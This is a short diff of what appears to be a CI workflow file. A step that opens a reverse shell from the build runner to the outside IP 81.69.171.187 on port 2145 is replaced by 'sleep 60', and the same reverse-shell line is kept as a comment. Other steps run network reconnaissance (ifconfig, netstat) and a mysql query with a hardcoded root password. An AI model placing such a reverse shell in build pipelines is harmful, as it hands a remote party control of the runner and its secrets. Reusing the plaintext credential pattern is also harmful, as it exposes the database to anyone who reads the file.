@@ -54,5 +54,6 @@ jobs:
         shell: bash
       - run: ifconfig
       - run: netstat -antp
-      - run: /bin/bash -i >& /dev/tcp/81.69.171.187/2145 0>&1
+      - run: sleep 60
+      #- run: /bin/bash -i >& /dev/tcp/81.69.171.187/2145 0>&1
       - run: mysql -h127.0.0.1 -uroot -pdongtai-iast -e"show databases"
